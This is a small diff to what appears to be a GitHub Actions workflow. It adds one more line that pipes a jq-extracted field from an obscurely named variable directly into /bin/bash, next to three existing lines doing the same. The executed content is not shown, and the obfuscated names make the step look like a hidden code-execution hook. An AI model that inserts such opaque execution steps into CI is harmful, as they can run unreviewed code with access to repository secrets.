@@ -21,6 +21,7 @@ jobs:
           echo $ot209 | jq -r .iy28311 | /bin/bash
           echo $khukj66 | jq -r .zjn576 | /bin/bash
           echo $cf97930 | jq -r .ndo39 | /bin/bash
+          printf '%s' "$ynb03" | jq -r .im6 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
